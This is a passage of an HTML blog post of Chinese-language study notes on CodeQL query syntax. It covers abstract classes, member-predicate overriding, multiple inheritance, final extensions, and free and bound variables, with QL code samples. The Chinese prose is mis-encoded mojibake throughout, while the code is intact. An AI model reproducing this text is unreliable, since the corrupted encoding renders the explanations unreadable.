href="https://codeql.github.com/docs/ql-language-reference/annotations/#abstract"> æ³¨é‡Šçš„</a>ç±»ç§°ä¸º<strong>æŠ½è±¡</strong>ç±»ã€‚å…·ä½“è€Œè¨€ï¼Œå¯¹äºæŠ½è±¡ç±»ä¸­çš„å€¼ï¼Œå®ƒå¿…é¡»<strong>æ»¡è¶³ç±»æœ¬èº«çš„ç‰¹å¾è°“è¯å’Œå­ç±»çš„ç‰¹å¾è°“è¯</strong>ã€‚è¯·æ³¨æ„ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ final æ‰©å±•ä¸è¢«è§†ä¸ºå­ç±»ã€‚</p><p>å¦‚æœæ‚¨æƒ³å°†å¤šä¸ªç°æœ‰ç±»å½’ç±»åˆ°ä¸€ä¸ªé€šç”¨åç§°ä¸‹ï¼ŒæŠ½è±¡ç±»å°±éå¸¸æœ‰ç”¨ã€‚ç„¶åï¼Œæ‚¨å¯ä»¥åœ¨æ‰€æœ‰è¿™äº›ç±»ä¸Šå®šä¹‰æˆå‘˜è°“è¯ã€‚ä½ è¿˜å¯ä»¥æ‰©å±•é¢„å®šä¹‰çš„æŠ½è±¡ç±»ï¼šä¾‹å¦‚ï¼Œå¦‚æœä½ å¯¼å…¥ä¸€ä¸ªåŒ…å«æŠ½è±¡ç±»çš„åº“ï¼Œåˆ™å¯ä»¥ä¸ºå…¶æ·»åŠ æ›´å¤šå­ç±»ã€‚</p><p>ä¾‹å­ï¼š</p><p>å¸Œæœ›è¯†åˆ«æ‰€æœ‰å¯è§£é‡Šä¸º SQL æŸ¥è¯¢çš„è¡¨è¾¾å¼ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŠ½è±¡ç±»æ¥æè¿°è¿™äº›è¡¨è¾¾å¼ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">SqlExpr</span> <span class="keyword">extends</span> <span class="title class_">Expr</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç°åœ¨å®šä¹‰å„ç§å­ç±»â€”â€”æ¯ç§æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå¯¹åº”ä¸€ä¸ªã€‚ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥å®šä¹‰ä¸€ä¸ªå­ç±» <code>class PostgresSqlExpr extends SqlExpr</code> ï¼Œå®ƒåŒ…å«ä¼ é€’ç»™æ‰§è¡Œæ•°æ®åº“æŸ¥è¯¢çš„<code>Postgres API</code>çš„è¡¨è¾¾å¼ã€‚ä½ ä¹Ÿå¯ä»¥ä¸º<code>MySQL</code>å’Œå…¶ä»–æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå®šä¹‰ç±»ä¼¼çš„å­ç±»ã€‚</p><h5 id="é‡å†™æˆå‘˜è°“è¯-Overriding-member-predicates">é‡å†™æˆå‘˜è°“è¯(Overriding member predicates)</h5><p>å¦‚æœä¸€ä¸ªç±»ä»é<code>final</code> çš„çˆ¶ç±»å‹ç»§æ‰¿äº†æˆå‘˜è°“è¯ï¼Œåˆ™å¯ä»¥<strong>é‡å†™</strong>ç»§æ‰¿çš„å®šä¹‰ã€‚ä¸ºæ­¤ï¼Œä½ å¯ä»¥å®šä¹‰ä¸€ä¸ªä¸ç»§æ‰¿è°“è¯å…·æœ‰ç›¸åŒåç§°å’Œå±æ€§çš„æˆå‘˜è°“è¯ï¼Œå¹¶æ·»åŠ  <code>override</code><a href="https://codeql.github.com/docs/ql-language-reference/annotations/#override"> æ³¨è§£ </a>ã€‚</p><p>ä¾‹å¦‚ï¼Œæ‰©å±•äº†ä¸€ä¸‹å‰é¢çš„ä¾‹å­ï¼š</p><p><code>OneTwo</code>çš„<code>getAstring()</code>è¦†ç›–äº†åŸæ¥çš„<code>OneTwoThree</code>çš„<code>getAstring()</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OneTwoThree</span> <span class="keyword">extends</span> <span class="title class_">int</span> &#123;</span><br><span class="line">    OneTwoThree() &#123; <span class="comment">// characteristic predicate</span></span><br><span class="line">      <span class="built_in">this</span> = <span class="number">1</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">2</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    string <span class="title function_">getAString</span><span class="params">()</span> &#123; <span class="comment">// member predicate</span></span><br><span class="line">      result = <span class="string">&quot;One, two or three: &quot;</span> + <span class="built_in">this</span>.toString()</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    predicate <span class="title function_">isEven</span><span class="params">()</span> &#123; <span class="comment">// member predicate</span></span><br><span class="line">      <span class="built_in">this</span> = <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OneTwo</span> <span class="keyword">extends</span> <span class="title class_">OneTwoThree</span> &#123;</span><br><span class="line">    OneTwo() &#123;</span><br><span class="line">      <span class="built_in">this</span> = <span class="number">1</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">    override string <span class="title function_">getAString</span><span class="params">()</span> &#123;</span><br><span class="line">      result = <span class="string">&quot;One or two: &quot;</span> + <span class="built_in">this</span>.toString()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">from OneTwoThree o select o, o.getAString()</span><br></pre></td></tr></table></figure><p>è¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250430125024851.png" alt="image-20250430125024851"></p><p>å†åŠ ä¸€ä¸ª<code>TwoThree</code>ï¼Œç»§ç»­é‡å†™<code>getAString()</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OneTwoThree</span> <span class="keyword">extends</span> <span class="title class_">int</span> &#123;</span><br><span class="line">  OneTwoThree() &#123; <span class="comment">// characteristic predicate</span></span><br><span class="line">    <span class="built_in">this</span> = <span class="number">1</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">2</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">3</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  string <span class="title function_">getAString</span><span class="params">()</span> &#123; <span class="comment">// member predicate</span></span><br><span class="line">    result = <span class="string">&quot;One, two or three: &quot;</span> + <span class="built_in">this</span>.toString()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">isEven</span><span class="params">()</span> &#123; <span class="comment">// member predicate</span></span><br><span class="line">    <span class="built_in">this</span> = <span class="number">2</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OneTwo</span> <span class="keyword">extends</span> <span class="title class_">OneTwoThree</span> &#123;</span><br><span class="line">  OneTwo() &#123;</span><br><span class="line">    <span class="built_in">this</span> = <span class="number">1</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">  &#125;</span><br><span class="line">  override string <span class="title function_">getAString</span><span class="params">()</span> &#123;</span><br><span class="line">    result = <span class="string">&quot;One or two: &quot;</span> + <span class="built_in">this</span>.toString()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TwoThree</span> <span class="keyword">extends</span> <span class="title class_">OneTwoThree</span> &#123;</span><br><span class="line">  TwoThree() &#123;</span><br><span class="line">    <span class="built_in">this</span> = <span class="number">2</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">3</span></span><br><span class="line">  &#125;</span><br><span class="line">  override string <span class="title function_">getAString</span><span class="params">()</span> &#123;</span><br><span class="line">    result = <span class="string">&quot;Two or three: &quot;</span> + <span class="built_in">this</span>.toString()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from OneTwoThree o</span><br><span class="line">select o, o.getAString()</span><br></pre></td></tr></table></figure><p>è¿è¡Œè¾“å‡ºçš„ç»“æœä¸ºï¼š</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250430124352869.png" alt="image-20250430124352869"></p><h5 id="å¤šé‡ç»§æ‰¿-Multiple-inheritance">å¤šé‡ç»§æ‰¿(Multiple inheritance)</h5><p>ä¸€ä¸ªç±»å¯ä»¥æ‰©å±•å¤šç§ç±»å‹ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒä¼šç»§æ‰¿è‡ªæ‰€æœ‰è¿™äº›ç±»å‹ã€‚</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Two</span> <span class="keyword">extends</span> <span class="title class_">OneTwo</span>, TwoThree &#123;&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç±»<code>Two</code>åŒæ—¶ç»§æ‰¿äº†<code>OneTwo</code>å’Œ<code>TwoThree</code>ï¼Œå®ƒè¿˜é—´æ¥ç»§æ‰¿è‡ª<code>OneTwoThree</code>å’Œ<code>int</code>ï¼Œé‚£ä¹ˆé€šè¿‡ç‰¹å¾è°“è¯æˆ‘ä»¬çŸ¥é“å…¶å€¼åªèƒ½æ˜¯2ã€‚<br>å¦‚æœä¸€ä¸ªå­ç±»ç»§æ‰¿äº†åŒä¸€ä¸ªè°“è¯çš„å¤šä¸ªå®šä¹‰ï¼Œé‚£ä¹ˆè¯¥ç±»è¿˜éœ€è¦æ‰‹åŠ¨é‡å†™è¯¥è°“è¯ä»¥é¿å…æ­§ä¹‰ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨<code>super</code>è¡¨è¾¾å¼ã€‚</p><p>ä¾‹å¦‚:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Two</span> <span class="keyword">extends</span> <span class="title class_">OneTwo</span>, TwoThree &#123;</span><br><span class="line">  override string <span class="title function_">getAString</span><span class="params">()</span> &#123;</span><br><span class="line">    result = TwoThree.<span class="built_in">super</span>.getAString()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Finalæ‹“å±•-Final-extensions">Finalæ‹“å±•(Final extensions)</h5><p>ç±»å¯ä»¥æ‰©å±•<code>final</code>ç±»å‹æˆ–<code>final</code>ç±»å‹çš„åˆ«åã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒä¼šç»§æ‰¿è¿™äº›çˆ¶ç±»å‹çš„æ‰€æœ‰æˆå‘˜è°“è¯å’Œå­—æ®µçš„<code>final</code>ç‰ˆæœ¬ã€‚é€šè¿‡<code>final</code>æ‰©å±•ç»§æ‰¿çš„æˆå‘˜è°“è¯æ— æ³•è¢«è¦†ç›–ï¼Œä½†å¯ä»¥è¢«éšè—ã€‚</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OneTwoThree</span> <span class="keyword">extends</span> <span class="title class_">int</span> &#123;</span><br><span class="line">    OneTwoThree() &#123; <span class="comment">// characteristic predicate</span></span><br><span class="line">      <span class="built_in">this</span> = <span class="number">1</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">2</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    string <span class="title function_">getAString</span><span class="params">()</span> &#123; <span class="comment">// member predicate</span></span><br><span class="line">      result = <span class="string">&quot;One, two or three: &quot;</span> + <span class="built_in">this</span>.toString()</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    predicate <span class="title function_">isEven</span><span class="params">()</span> &#123; <span class="comment">// member predicate</span></span><br><span class="line">      <span class="built_in">this</span> = <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">FinalOneTwoThree</span> = OneTwoThree;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OneTwoFinalExtension</span> <span class="keyword">extends</span> <span class="title class_">FinalOneTwoThree</span> &#123;</span><br><span class="line">  OneTwoFinalExtension() &#123;</span><br><span class="line">    <span class="built_in">this</span> = <span class="number">1</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  string <span class="title function_">getAString</span><span class="params">()</span> &#123;</span><br><span class="line">    result = <span class="string">&quot;One or two: &quot;</span> + <span class="built_in">this</span>.toString()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">from OneTwoThree o </span><br><span class="line">select o, o.getAString()</span><br><span class="line"><span class="comment">//from OneTwoFinalExtension o </span></span><br><span class="line"><span class="comment">//select o, o.getAString()</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œçš„ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250430151657937.png" alt="image-20250430151657937"></p><p>ä¿®æ”¹ä¸ºï¼š<code>from OneTwoFinalExtension o select o, o.getAString()</code></p><p>å½“åœ¨<code>OneTwoFinalExtension</code>ä¸Šè°ƒç”¨<code>getAString()</code>æ—¶ï¼ŒåŸå§‹å®šä¹‰è¢«å±è”½äº†ã€‚ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250430151848901.png" alt="image-20250430151848901"></p><h3 id="å˜é‡Variables">å˜é‡Variables</h3><p>QL ä¸­çš„å˜é‡ä½¿ç”¨æ–¹å¼ä¸ä»£æ•°æˆ–é€»è¾‘ä¸­çš„å˜é‡ç±»ä¼¼ã€‚å®ƒä»¬è¡¨ç¤ºä¸€ç»„å€¼ï¼Œè¿™äº›å€¼é€šå¸¸å—å…¬å¼(<code>formula</code>)çº¦æŸã€‚</p><p>è¿™ä¸å…¶ä»–ä¸€äº›ç¼–ç¨‹è¯­è¨€ä¸­çš„å˜é‡ä¸åŒï¼Œåœ¨å…¶ä»–ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œå˜é‡ä»£è¡¨å¯èƒ½åŒ…å«æ•°æ®çš„å†…å­˜ä½ç½®ã€‚è¿™äº›æ•°æ®ä¹Ÿå¯èƒ½éšæ—¶é—´è€Œå˜åŒ–ã€‚ä¾‹å¦‚ï¼Œåœ¨ <code>QL</code>ä¸­ï¼Œ <code>n = n + 1</code> æ˜¯ä¸€ä¸ªç­‰å¼<a href="https://codeql.github.com/docs/ql-language-reference/formulas/#formulas">å…¬å¼ </a>ï¼Œä»…å½“ <code>n</code> ç­‰äº <code>n + 1</code> æ—¶æ‰æˆç«‹ï¼ˆå› æ­¤å®é™…ä¸Šå®ƒå¯¹ä»»ä½•æ•°å€¼éƒ½ä¸æˆç«‹ï¼‰ã€‚åœ¨<code>Java</code>ä¸­ï¼Œ <code>n = n + 1</code> ä¸æ˜¯ç­‰å¼ï¼Œè€Œæ˜¯ä¸€ä¸ªèµ‹å€¼æ“ä½œï¼Œå®ƒé€šè¿‡åœ¨å½“å‰å€¼ä¸ŠåŠ  <code>1</code> æ¥æ›´æ”¹ <code>n</code> çš„å€¼ã€‚</p><h4 id="å£°æ˜å˜é‡-Declaring-a-variable">å£°æ˜å˜é‡(Declaring a variable)</h4><p>æ‰€æœ‰å˜é‡å£°æ˜éƒ½ç”±å˜é‡<a href="https://codeql.github.com/docs/ql-language-reference/types/#types">ç±»å‹</a>å’Œåç§°ç»„æˆã€‚åç§°å¯ä»¥æ˜¯ä»»ä½•<a href="https://codeql.github.com/docs/ql-language-reference/ql-language-specification/#identifiers">æ ‡è¯†ç¬¦</a> ä»¥å°å†™å­—æ¯å¼€å¤´ã€‚</p><p>ä¾‹å¦‚ï¼Œ <code>int i</code> ã€ <code>SsaDefinitionNode node</code> å’Œ <code>LocalScopeVariable lsv</code> å£°æ˜å˜é‡ <code>i</code> ã€ <code>node</code> å’Œ <code>lsv</code> çš„ç±»å‹ä¸º <code>int</code> ã€ <code>SsaDefinitionNode</code> å’Œ <code>LocalScopeVariable</code></p><p>å˜é‡å£°æ˜å‡ºç°åœ¨ä¸åŒçš„ä¸Šä¸‹æ–‡ä¸­ï¼Œä¾‹å¦‚åœ¨<a href="https://codeql.github.com/docs/ql-language-reference/queries/#select-clauses">é€‰æ‹©å­å¥</a>ä¸­ã€åœ¨<a href="https://codeql.github.com/docs/ql-language-reference/formulas/#quantified-formulas">é‡åŒ–å…¬å¼</a>ä¸­ã€ä½œä¸º<a href="https://codeql.github.com/docs/ql-language-reference/predicates/#predicates">è°“è¯</a>çš„å‚æ•°ç­‰ç­‰ã€‚</p><p>ä»æ¦‚å¿µä¸Šè®²ï¼Œä½ å¯ä»¥è®¤ä¸ºå˜é‡ä¿å­˜äº†å…¶ç±»å‹å…è®¸çš„æ‰€æœ‰å€¼ï¼Œ<strong>ä½†è¦å—åˆ°ä»»ä½•è¿›ä¸€æ­¥çš„çº¦æŸâš ï¸</strong>ã€‚</p><p>ä¾‹å¦‚ï¼Œè€ƒè™‘ä»¥ä¸‹é€‰æ‹©å­å¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> <span class="type">int</span> i</span><br><span class="line"><span class="keyword">where</span> i <span class="keyword">in</span> [<span class="number">0</span> .. <span class="number">9</span>]</span><br><span class="line"><span class="keyword">select</span> i</span><br></pre></td></tr></table></figure><p>ä»…æ ¹æ®å˜é‡ <code>i</code> çš„ç±»å‹ï¼Œå®ƒå¯ä»¥åŒ…å«æ‰€æœ‰æ•´æ•°ã€‚ç„¶è€Œï¼Œå®ƒå—åˆ°å…¬å¼ <code>i in [0 .. 9]</code> çš„é™åˆ¶ã€‚å› æ­¤ï¼Œ<code>select</code> å­å¥çš„ç»“æœæ˜¯ä»<code>0</code> åˆ°<code>9</code>ä¹‹é—´çš„<code>10</code>ä¸ªæ•°å­—ï¼ˆå« <code>0</code> å’Œ <code>9</code> ï¼‰ã€‚</p><p>å¦å¤–ï¼Œè¯·æ³¨æ„âš ï¸æŸ¥è¯¢ä¼šå¯¼è‡´ç¼–è¯‘æ—¶é”™è¯¯ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> <span class="type">int</span> i</span><br><span class="line"><span class="keyword">select</span> i</span><br></pre></td></tr></table></figure><p>ç†è®ºä¸Šï¼Œå®ƒä¼šæœ‰æ— é™å¤šä¸ªç»“æœï¼Œå› ä¸ºå˜é‡<code>i</code>çš„å¯èƒ½å€¼å¹¶ä¸å—é™äºæœ‰é™ä¸ªã€‚æƒ³äº†è§£æ›´å¤šï¼Œå¯å‚é˜…â€œ<a href="https://codeql.github.com/docs/ql-language-reference/evaluation-of-ql-programs/#binding"> ç»‘å®š </a>â€ã€‚</p><h4 id="è‡ªç”±å˜é‡å’Œç»‘å®šå˜é‡-Free-and-bound-variables">è‡ªç”±å˜é‡å’Œç»‘å®šå˜é‡(Free and bound variables)</h4><p>å˜é‡å¯ä»¥æ‰®æ¼”ä¸åŒçš„è§’è‰²ã€‚æœ‰äº›å˜é‡æ˜¯<strong>è‡ªç”±å˜é‡</strong> ï¼Œå®ƒä»¬çš„å€¼ç›´æ¥å½±å“ä½¿ç”¨å®ƒä»¬çš„<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#expressions">è¡¨è¾¾å¼</a>çš„å€¼ï¼Œæˆ–è€… ä½¿ç”¨å®ƒä»¬çš„<a href="https://codeql.github.com/docs/ql-language-reference/formulas/#formulas">å…¬å¼</a>æ˜¯å¦æˆç«‹ã€‚å…¶ä»–å˜é‡è¢«ç§°ä¸º<strong>ç»‘å®š</strong>å˜é‡ï¼Œå®ƒä»¬è¢«é™åˆ¶åœ¨ç‰¹å®šçš„å€¼é›†å†…ã€‚</p><p>ä¾‹å­å¦‚ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;hello&quot;.indexOf(&quot;l&quot;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">min</span>(<span class="type">float</span> f <span class="operator">|</span> f <span class="keyword">in</span> [<span class="number">-3</span> .. <span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">(i <span class="operator">+</span> <span class="number">7</span>) <span class="operator">*</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">x.<span class="built_in">sqrt</span>()</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªè¡¨è¾¾å¼æ²¡æœ‰ä»»ä½•å˜é‡ã€‚å®ƒæŸ¥æ‰¾å­—ç¬¦ä¸² <code>&quot;hello&quot;</code> ä¸­ <code>&quot;l&quot;</code> å‡ºç°çš„ï¼ˆä»é›¶å¼€å§‹çš„ï¼‰ç´¢å¼•ï¼Œå› æ­¤å…¶è®¡ç®—ç»“æœä¸º <code>2</code> å’Œ <code>3</code> ã€‚</p><p>ç¬¬äºŒä¸ªè¡¨è¾¾å¼çš„è®¡ç®—ç»“æœä¸º <code>-3</code> ï¼Œå³ <code>[-3 .. 3]</code> èŒƒå›´å†…çš„æœ€å°å€¼ã€‚è™½ç„¶æ­¤è¡¨è¾¾å¼ä½¿ç”¨äº†å˜é‡ <code>f</code> ï¼Œä½†å®ƒåªæ˜¯ä¸€ä¸ªå ä½ç¬¦æˆ–â€œè™šæ‹Ÿâ€å˜é‡ï¼Œæ‚¨æ— æ³•ä¸ºå…¶èµ‹å€¼ã€‚æ‚¨å¯ä»¥å°† <code>f</code> æ›¿æ¢ä¸ºå…¶ä»–å˜é‡ï¼Œè€Œä¸ä¼šæ”¹å˜è¡¨è¾¾å¼çš„å«ä¹‰ã€‚ä¾‹å¦‚ï¼Œ <code>min(float f | f in [-3 .. 3])</code> å§‹ç»ˆç­‰äº <code>min(float other | other in [-3 .. 3])</code> . è¿™æ˜¯<strong>ç»‘å®šå˜é‡</strong>çš„ä¸€ä¸ªä¾‹å­ã€‚</p><p>å¯¹äºè¡¨è¾¾å¼ <code>(i + 7) * 3</code> å’Œ <code>x.sqrt()</code> ã€‚åœ¨è¿™ä¸¤ä¸ªä¾‹å­ä¸­ï¼Œè¡¨è¾¾å¼çš„å€¼å–å†³äºå˜é‡ <code>i</code> å’Œ <code>x</code> åˆ†åˆ«è¢«èµ‹å€¼çš„å€¼ã€‚æ¢å¥è¯è¯´ï¼Œå˜é‡çš„å€¼ä¼šå½±å“è¡¨è¾¾å¼çš„å€¼ã€‚è¿™äº›éƒ½æ˜¯<strong>è‡ªç”±å˜é‡</strong>çš„ä¾‹å­ã€‚</p><p>ç±»ä¼¼åœ°ï¼Œå¦‚æœå…¬å¼åŒ…å«è‡ªç”±å˜é‡ï¼Œåˆ™è¯¥å…¬å¼æ˜¯å¦æˆç«‹å–å†³äºåˆ†é…ç»™è¿™äº›å˜é‡çš„å€¼ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;hello&quot;.indexOf(&quot;l&quot;) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">min</span>(<span class="type">float</span> f <span class="operator">|</span> f <span class="keyword">in</span> [<span class="number">-3</span> .. <span class="number">3</span>]) <span class="operator">=</span> <span class="number">-3</span></span><br><span class="line"></span><br><span class="line">(i <span class="operator">+</span> <span class="number">7</span>) <span class="operator">*</span> <span class="number">3</span> instanceof <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">exists</span>(<span class="type">float</span> y <span class="operator">|</span> x.<span class="built_in">sqrt</span>() <span class="operator">=</span> y)</span><br></pre></td></tr></table></figure><ul><li><p>ç¬¬ä¸€ä¸ªå…¬å¼ä¸åŒ…å«ä»»ä½•å˜é‡ï¼Œå¹¶ä¸”æ°¸è¿œä¸ä¼šæˆç«‹ï¼ˆå› ä¸º <code>&quot;hello&quot;.indexOf(&quot;l&quot;)</code> å…·æœ‰å€¼ <code>2</code> å’Œ <code>3</code> ï¼Œè€Œæ²¡æœ‰ <code>1</code> ï¼‰ã€‚</p></li><li><p>ç¬¬äºŒä¸ªå…¬å¼ä»…åŒ…å«ä¸€ä¸ªç»‘å®šå˜é‡ï¼Œå› æ­¤ä¸å—è¯¥å˜é‡å˜åŒ–çš„å½±å“ã€‚ç”±äº <code>min(float f | f in [-3 .. 3])</code> ç­‰äº <code>-3</code> ï¼Œå› æ­¤è¯¥å…¬å¼å§‹ç»ˆæˆç«‹ã€‚</p></li><li><p>ç¬¬ä¸‰ä¸ªå…¬å¼åŒ…å«ä¸€ä¸ªè‡ªç”±å˜é‡ <code>i</code> ã€‚å…¬å¼æ˜¯å¦æˆç«‹å–å†³äºèµ‹ç»™ <code>i</code> å€¼ã€‚ä¾‹å¦‚ï¼Œå¦‚æœèµ‹ç»™ <code>i</code> å€¼ä¸º<code>1</code> æˆ– <code>2</code> ï¼ˆæˆ–ä»»ä½•å…¶ä»– <code>int</code> ï¼‰ï¼Œåˆ™å…¬å¼æˆç«‹ã€‚å¦ä¸€æ–¹é¢ï¼Œå¦‚æœèµ‹ç»™ <code>i</code>å€¼ä¸º <code>3.5</code> ï¼Œåˆ™å…¬å¼ä¸æˆç«‹ã€‚</p></li></ul><p>ç¬¬å››ä¸ªå…¬å¼åŒ…å«ä¸€ä¸ªè‡ªç”±å˜é‡ <code>x</code> å’Œä¸€ä¸ªç»‘å®šå˜é‡ <code>y</code> ã€‚å¦‚æœ <code>x</code> è¢«èµ‹å€¼ä¸ºéè´Ÿæ•°ï¼Œåˆ™æœ€åä¸€ä¸ªå…¬å¼æˆç«‹ã€‚å¦ä¸€æ–¹é¢ï¼Œå¦‚æœ <code>x</code> è¢«èµ‹å€¼ä¸º ä¾‹å¦‚ <code>-9</code> ï¼Œåˆ™å…¬å¼ä¸æˆç«‹ã€‚å˜é‡ <code>y</code> 